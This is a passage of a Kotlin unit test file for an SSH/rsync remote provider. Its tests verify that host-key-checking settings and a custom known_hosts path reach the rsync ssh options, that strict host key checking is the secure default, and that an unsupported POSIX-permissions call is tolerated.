        "rsync command threads knownHostsFile override end-to-end" {
            // The `knownHostsFile` property must land in the rsync `-e` ssh
            // payload's `UserKnownHostsFile` option, not just in the SDK
            // constructor.
            val args =
                captureRsyncArgs(
                    mapOf(
                        "username" to "user",
                        "address" to "host",
                        "path" to "/path",
                        "knownHostsFile" to "/etc/datadatdat/known_hosts",
                    ),
                )
            val sshOpts = sshOptionString(args)
            sshOpts.contains("StrictHostKeyChecking=yes") shouldBe true
            sshOpts.contains("UserKnownHostsFile=/etc/datadatdat/known_hosts") shouldBe true
        }

        "rsync command honors skipHostCheck=false explicit secure default" {
            // Spelled-out `false` must behave identically to the unset case.
            val args =
                captureRsyncArgs(
                    mapOf(
                        "username" to "user",
                        "address" to "host",
                        "path" to "/path",
                        "skipHostCheck" to false,
                    ),
                )
            val sshOpts = sshOptionString(args)
            sshOpts.contains("StrictHostKeyChecking=yes") shouldBe true
            sshOpts.contains("UserKnownHostsFile=/dev/null") shouldBe false
        }

        "get rsync passes skipHostCheck and knownHostsFile to RsyncExecutor" {
            // Lower-level companion assertion: independent of the rsync
            // invocation, the constructed executor must expose the values the
            // SDK will later forward into `run()`. Caught a class of bug where
            // the args were dropped on the floor before reaching the
            // executor.
            val op =
                RemoteOperation(
                    updateProgress = { _: RemoteProgress, _: String?, _: Int? -> Unit },
                    remote =
                        mapOf(
                            "username" to "user",
                            "address" to "host",
                            "path" to "/path",
                            "skipHostCheck" to true,
                            "knownHostsFile" to "/etc/known_hosts",
                        ),
                    parameters = mapOf("password" to "password"),
                    operationId = "operation",
                    commitId = "commit",
                    commit = null,
                    type = RemoteOperationType.PULL,
                )
            val rsync = server.getRsync(op, null, "/src", "user@host:/dst", executor)
            rsync.skipHostCheck shouldBe true
            rsync.knownHostsFile shouldBe "/etc/known_hosts"
        }

        "get rsync defaults skipHostCheck to false for unset remote" {
            // No `skipHostCheck` property → secure default (false) gets
            // forwarded to the executor. Mirrors the metadata path's
            // default-secure behavior from PR #62.
            val op =
                RemoteOperation(
                    updateProgress = { _: RemoteProgress, _: String?, _: Int? -> Unit },
                    remote = mapOf("username" to "user", "address" to "host", "path" to "/path"),
                    parameters = mapOf("password" to "password"),
                    operationId = "operation",
                    commitId = "commit",
                    commit = null,
                    type = RemoteOperationType.PULL,
                )
            val rsync = server.getRsync(op, null, "/src", "user@host:/dst", executor)
            rsync.skipHostCheck shouldBe false
            rsync.knownHostsFile shouldBe null
        }

        "posix permissions exception is swallowed when not supported" {
            // Exercises the UnsupportedOperationException catch on Windows-like
            // file systems (line ~127). We mock Files.setPosixFilePermissions to
            // throw so the branch executes on every platform.
            mockkStatic(Files::class)
            every { Files.setPosixFilePermissions(any(), any()) } throws UnsupportedOperationException("no posix")
            val file =
                kotlin.io.path
                    .createTempFile()
                    .toFile()
            try {
                // Must not propagate the exception.
                val command =
                    server.buildSshCommand(
                        emptyMap(),
                        mapOf("password" to "password"),
                        file,
                        false,
                    )
                command shouldNotBe null
            } finally {
                file.delete()
            }
        }
    })
